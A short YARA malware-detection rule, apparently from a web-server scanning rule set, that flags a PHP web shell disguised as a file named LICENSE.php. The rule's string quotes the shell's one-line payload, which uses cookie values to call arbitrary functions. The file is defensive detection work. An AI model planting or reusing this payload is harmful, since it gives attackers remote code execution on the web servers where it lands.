/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-19
   Identifier: shell1
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_19_18_shell1_LICENSE {
   meta:
      description = "shell1 - file LICENSE.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-19"
      hash1 = "4e9cb313200977e09fd70d5621b5aac9a7435f27875cab715edb64c7bbad9f13"
   strings:
      $s1 = "<?php extract($_COOKIE); if ($F) { @$F($A,$B); @$W($X($Y,$Z)); }" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}
